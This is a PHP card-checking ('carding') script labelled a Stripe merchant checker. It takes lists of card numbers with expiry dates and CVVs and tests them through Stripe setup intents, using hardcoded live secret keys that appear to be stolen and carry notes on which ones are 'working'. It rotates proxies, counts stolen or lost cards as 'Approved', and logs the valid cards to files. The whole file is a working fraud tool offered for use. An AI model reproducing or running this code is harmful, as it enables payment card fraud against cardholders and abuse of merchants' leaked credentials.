<?php
//////////////// Stripe Merchant Checker Source by ali [ @ali_mo7med ]

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$proxySocks4 = $_GET['proxy'];

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false)
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//put you sk_live keys here
$skeys = array(
 // 1 => 'sk_live_mPQPqBjlmCIVbomtNzjiHZYQ00q6sGC498',  acc cant make live charges
 // 2 => 'sk_live_Vu3rhVCBmRUgWLO9WJ41ZEiK00Ob8FlImR', working
 // 3 => 'sk_live_Dayz63zRhtv8kms0qBGAwefk00mkXF5VYF',
 // 4 => 'sk_live_ecJBE8M0kjQrjH3mEp5zLn1U00bYfUqfDx',
 // 5 => 'sk_live_t0M4gnlwCmldiI9sJi491eUn00TWwZ7a3b', working
  //6 => 'sk_live_vwDTNphuu1CkMYfkCjTvt96D00jGMbQDK9',
 // 7 => 'sk_live_i0Ane4kbdQWD4xZAOGCuJ2Pj00io61qd5K',working
 // 8 => 'sk_live_gSbu0obx5swkyGX6DvBgc62Q00gD3Rv7wM', working
  //9 => 'sk_live_XsFy6cBEOcufhzcf99LI3i1D00QEkccpPd',
  //10=> 'sk_live_ywtjXG6z4hL4H9zNkCR7SgYu00eQjLK0mS',working
  //11 => 'sk_live_NVqbtxIuhFyKohMyaxutthzt00cTWc4BVV',
  //12 => 'sk_live_8dUpH4QQma9Mb7OrwGj8dzbM00crYhDCY0',
  13 => 'sk_live_tqtRXghExcXhAq11BV6YJbXJ00yE9zHX1M',
    );
    $skey = array_rand($skeys);
    $sk = $skeys[$skey];




    function saveCVV($cc)
{
    $file = dirname(__FILE__) . "/CVV_Lives.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}


  function saveREALCVV($cc)
{
    $file = dirname(__FILE__) . "/REALCVV_Lives.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp);
}



#=====================================================================================================#
$ch = curl_init();
if (isset($proxySocks4)) {    // If the $proxy variable is set, then
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);    // Set CURLOPT_PROXY with proxy in $proxy variable
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers'); ////To generate customer id
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Michael Johnson');
 $f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);

$id = trim(strip_tags(getstr($f,'"id": "','"')));

$ch = curl_init();
if (isset($proxySocks4)) {    // If the $proxy variable is set, then
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);    // Set CURLOPT_PROXY with proxy in $proxy variable
}
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents'); ////To generate payment token [It wont charge]
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[card][cvc]='.$cvv.'');
  $result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);
 $c = json_decode(curl_exec($ch), true);
curl_close($ch);

 $pam = trim(strip_tags(getstr($result,'"payment_method": "','"')));

  $cvv = trim(strip_tags(getstr($result,'"cvc_check": "','"')));

if ($c["status"] == "succeeded") {


    $ch = curl_init();
    if (isset($proxySocks4)) {    // If the $proxy variable is set, then
    curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);    // Set CURLOPT_PROXY with proxy in $proxy variable
    }
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');

    $result = curl_exec($ch);
    curl_close($ch);

    // $pm = $c["payment_method"];

    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
 $attachment_to_her = json_decode(curl_exec($ch), true);
    curl_close($ch);
   $attachment_to_her;
    if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass") {
        saveREALCVV("$lista");
         echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-danger"> Approved  [CVV MATCHED] </i></font><br>';

    } else {
      echo '<font size=3.5 color="white"><font class="badge badge-danger">Reprovada ?? @uchihacommunity ?? </i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-danger"> Your card was declined. do_not_honour </i></font></span><br>';


    }

}
elseif(strpos($result, '"cvc_check": "pass"')){
    saveREALCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CVV Matched] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <br>';
}
elseif(strpos($result, 'security code is incorrect')){
    saveCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CCN LIVE]</i></font> </i></font> <br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')){
    saveREALCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [Insufficient funds.] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <br>';
}
elseif(strpos($result, 'pickup_card')){
    saveREALCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CVV Matched]</i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <br>';
}
elseif(strpos($result, 'invalid cvc')){
    saveCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CNN Live] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <br>';
}
elseif(strpos($result, 'incorrect_cvc')){
    saveCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CCN LIVE]</i></font> </i></font> <br>';
}
elseif(strpos($result, 'stolen_card')){
    saveREALCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CVV Matched] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <br>';
}
elseif(strpos($result, 'transaction_not_allowed')){
    saveREALCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [transaction not allowed]</i></font> </i></font> <br>';
}
elseif(strpos($result, 'lost_card')){
    saveREALCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CVV Matched] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <br>';
}
elseif(strpos($result, 'expired_card')){
    saveREALCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [Expired Card]</i></font> </i></font> <br>';
}

elseif(strpos($result, 'Your card does not support this type of purchase.')){
    saveREALCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-success">#Approved ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-secondary"> [CVV Matched]</i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <br>';
}

elseif (isset($c["error"])) {
    saveCVV("$lista");
    echo '<font size=3.5 color="white"><font class="badge badge-danger">Reprovada ?? @uchihacommunity ?? </i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-danger"> ' . $c["error"] ["message"] . ' ' . $c ["error"]["decline_code"] . ' </i></font></span><br>';

}
else {
    saveCVV("$lista");
   echo '<font size=3.5 color="white"><font class="badge badge-danger">Reprovada ?? @uchihacommunity ??</i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">Gate Fucked</i></font><br>';
}


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');

curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);

#======================================================[@Dr34m_C4t]=============================================================#
?>
